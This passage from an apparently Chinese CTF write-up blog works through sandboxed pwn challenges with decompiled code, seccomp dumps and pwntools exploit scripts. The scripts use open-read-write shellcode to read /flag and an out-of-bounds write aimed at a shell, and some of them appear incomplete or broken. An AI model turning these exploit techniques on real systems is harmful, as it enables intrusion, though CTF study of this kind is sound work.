class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br><br><span class="hljs-comment">// option选项有很多，剩下的参数也由option确定，这里介绍两个主要的option</span><br><span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span><br><br><span class="hljs-comment">// option为38的情况</span><br><span class="hljs-comment">// 此时第二个参数设置为1，则禁用execve系统调用且子进程一样受用</span><br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br><br><span class="hljs-comment">// option为22的情况</span><br><span class="hljs-comment">// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span><br><span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span><br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p><strong>沙箱</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v1 = <span class="hljs-number">4</span>;<br>v2 = &amp;v3;<br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure><p><strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;test NSS sandbox&quot;</span>);<br>  mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">50</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x64</span>uLL);<br>  MEMORY[<span class="hljs-number">0x50000</span>]();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><p><strong>直接往栈上搓shellcode，试试卓牛以前讲的，更换x86-64架构，进行pwn</strong></p><p><strong>retfq切换模式</strong></p><h3 id="exp1-切换模式"><a href="#exp1-切换模式" class="headerlink" title="exp1:切换模式"></a>exp1:切换模式</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="exp2-ORW"><a href="#exp2-ORW" class="headerlink" title="exp2:ORW"></a>exp2:ORW</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.34.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./myexec&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ ORW   ----------------------------</span><br>mmap_place = <span class="hljs-number">0x50000</span><br><br>payload = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload += asm(shellcraft.read(<span class="hljs-number">3</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x300</span>))<br>payload += asm(shellcraft.write(<span class="hljs-number">1</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x300</span>))<br><br>sa(<span class="hljs-string">b&#x27;sandbox&#x27;</span>, payload)<br>    <br>pi()<br></code></pre></td></tr></table></figure><h2 id="2-MyMem"><a href="#2-MyMem" class="headerlink" title="2.MyMem"></a>2.MyMem</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p><strong>沙箱</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">v1 = <span class="hljs-number">6</span>;<br>v2 = &amp;v3;<br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure><p>seccomp-tools </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">$ seccomp-tools dump ./mymem<br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x02</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0004</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000003b</span>  <span class="hljs-keyword">if</span> (A != execve) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br><br></code></pre></td></tr></table></figure><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  sandbox();<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;test NSS sandbox&quot;</span>);<br>  mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x1000</span>uLL, <span class="hljs-number">7</span>, <span class="hljs-number">50</span>, <span class="hljs-number">-1</span>, <span class="hljs-number">0LL</span>);<br>  read(<span class="hljs-number">0</span>, (<span class="hljs-type">void</span> *)<span class="hljs-number">0x50000</span>, <span class="hljs-number">0x64</span>uLL);<br>  MEMORY[<span class="hljs-number">0x50000</span>]();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><p>不能用更换x86-64架构，绕过orw，进行pwn</p><p>方法：</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.34.so&#x27;</span>)<br>banary = <span class="hljs-string">&quot;./mymem&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ ORW   ----------------------------</span><br>mmap_place = <span class="hljs-number">0x50000</span><br><br>payload = asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>))<br>payload += asm(shellcraft.read(<span class="hljs-number">3</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x100</span>))<br>payload += asm(shellcraft.write(<span class="hljs-number">1</span>, mmap_place+<span class="hljs-number">0x300</span>, <span class="hljs-number">0x100</span>))<br><br>sa(<span class="hljs-string">b&#x27;sandbox&#x27;</span>, payload)<br>    <br>pi()<br></code></pre></td></tr></table></figure><h2 id="3-old-fashion"><a href="#3-old-fashion" class="headerlink" title="3.old fashion"></a>3.old fashion</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p><strong>guess_number</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">guess_number</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+Ch] [rbp-14h] BYREF</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  v0 = time(<span class="hljs-number">0LL</span>);<br>  srand(v0);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">16</span>; ++i )<br>  &#123;<br>    v4 = rand() % <span class="hljs-number">100</span> + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Guess the number (between 1 and 100): &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v2);<br>    <span class="hljs-keyword">if</span> ( v4 == v2 )<br>    &#123;<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Congratulations! You guessed the number correctly.&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Sorry, the correct number is %d.\n&quot;</span>, v4);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>本来想用正确做法的，但是在调试中，随便选的数，也能过</strong></p><p><strong>main</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">size_t</span> size; <span class="hljs-comment">// [rsp+8h] [rbp-18h] BYREF</span><br>  <span class="hljs-type">char</span> *v4; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)guess_number() == <span class="hljs-number">1</span> )<br>  &#123;<br>    yay();<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;difficult? Ok , i will give you a gift , how big gift you want ? &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;size);<br>    v4 = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;here you are: %p\n&quot;</span>, v4);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;offset ? &quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%ld&quot;</span>, &amp;size);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;i thint you may write /bin/sh here&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%zu&quot;</span>, &amp;v4[<span class="hljs-number">8</span> * size]); <span class="hljs-comment">//%zu输出size_t型,unsigned int</span><br>  &#125;<br>  _exit(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><p>可以负向写到exit，输入&#x2F;bin&#x2F;sh的数字形式</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="hljs-comment">#context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;</span><br><br>libc = cdll.LoadLibrary(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)<br>banary = <span class="hljs-string">&quot;./zzzzz&quot;</span><br>elf = ELF(banary)<br>ip = <span class="hljs-string">&#x27;1&#x27;</span><br>port = <span class="hljs-number">1</span><br><br>local = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span>(local==<span class="hljs-number">1</span>):<br>p = process(banary)<br><span class="hljs-keyword">else</span>:<br>p = remote(ip, port)<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>gdb.attach(p)<br>pause()<br><br>s = <span class="hljs-keyword">lambda</span> data : p.send(data)<br>sl = <span class="hljs-keyword">lambda</span> data : p.sendline(data)<br>sa = <span class="hljs-keyword">lambda</span> text, data : p.sendafter(text, data)<br>sla = <span class="hljs-keyword">lambda</span> text, data : p.sendlineafter(text, data)<br>r = <span class="hljs-keyword">lambda</span> : p.recv()<br>ru = <span class="hljs-keyword">lambda</span> text : p.recvuntil(text)<br>uu32 = <span class="hljs-keyword">lambda</span> : u32(p.recvuntil(<span class="hljs-string">b&quot;\xff&quot;</span>)[-<span class="hljs-number">4</span>:].ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>uu64 = <span class="hljs-keyword">lambda</span> : u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>lg = <span class="hljs-keyword">lambda</span> s : log.info(<span class="hljs-string">&#x27;\x1b[01;38;5;214m %s --&gt; 0x%x \033[0m&#x27;</span> % (s, <span class="hljs-built_in">eval</span>(s)))<br>pi = <span class="hljs-keyword">lambda</span> : p.interactive()<br><span class="hljs-comment">#------------------------ 1.number  ----------------------------</span><br>system = <span class="hljs-number">0x4013A6</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>sla(<span class="hljs-string">b&#x27;Guess the number (between 1 and 100): &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br><br>size = <span class="hljs-number">128</span><br>sla(<span class="hljs-string">b&#x27;want ? &#x27;</span>, <span class="hljs-built_in">str</span>(size)) <br><br>p.recvuntil(<span class="hljs-string">b&#x27;are: &#x27;</span>) <br>heap = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">10</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap))<br><br>size2 = ((heap_addr - <span class="hljs-number">0x404018</span>) // <span class="hljs-number">8</span>) * -<span class="hljs-number">1</span><br>sa(<span class="hljs-string">b&#x27;offset ? &#x27;</span>, size) <br><br>payload = <span class="hljs-number">4199330</span><br>sa(<span class="hljs-string">b&#x27;i thint you may write /bin/sh here&#x27;</span>, payload)<br><br><br>pi()<br></code></pre></td></tr></table></figure><h2 id="4-most-safe"><a href="#4-most-safe" class="headerlink" title="4.most safe"></a>4.most safe</h2><p>BF_JIT</p>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DASCTF10- Magic_Book</title>
    <link href="/2022/12/02/DASCTF10-%20Magic_Book/"/>
    <url>/2022/12/02/DASCTF10-%20Magic_Book/</url>
    
    <content type="html"><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ol><li><strong>House of bot cake</strong></li><li><strong>爆破_IO_2_1_stdout</strong></li><li><strong>劫持free_hook</strong></li></ol><h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>libc版本：Ubuntu GLIBC 2.31-0ubuntu9.9</p><p>一个堆的菜单题</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a><strong>main</strong></h3><p>菜单选择，输1进promise函数，18次malloc，大小可控</p><p>​   输2进recall函数，10次free</p><p>​   输9进gift函数，有个一次性uaf的漏洞点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl __noreturn <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+Ch] [rbp-14h] BYREF</span><br>  <span class="hljs-type">int</span> *v5; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">unsigned</span> __int64 v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  v6 = __readfsqword(<span class="hljs-number">0x28</span>u);<br>  init(argc, argv, envp);<br>  v4 = <span class="hljs-number">0</span>;<br>  v5 = &amp;v4;<br>  start();<br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>  &#123;<br>    <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>    &#123;<br>      menu();<br>      __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, v5);<br>      v3 = *v5;<br>      <span class="hljs-keyword">if</span> ( *v5 != <span class="hljs-number">9</span> )<br>        <span class="hljs-keyword">break</span>;<br>      gift();<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( v3 &lt;= <span class="hljs-number">9</span> )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3 == <span class="hljs-number">1</span> )<br>      &#123;<br>        Promise();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3 == <span 